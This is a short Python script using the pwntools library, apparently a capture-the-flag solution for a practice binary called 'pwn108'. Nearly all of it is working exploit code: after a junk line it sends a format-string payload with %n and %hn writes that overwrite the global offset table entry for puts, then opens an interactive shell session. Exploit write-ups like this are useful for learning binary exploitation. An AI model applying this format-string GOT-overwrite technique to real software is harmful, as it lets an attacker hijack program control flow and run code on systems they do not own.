
from pwn import *


context.binary = binary = ELF('./pwn108')

got_put = binary.got.puts

junk_payload = b'A'*0x12



payload = b'%64X%13$n'+ b'%4603X%14$hnAAA' + p64(got_put+2)+p64(got_put)

p = process()
p.sendline(junk_payload)
p.sendline(payload)
p.interactive()
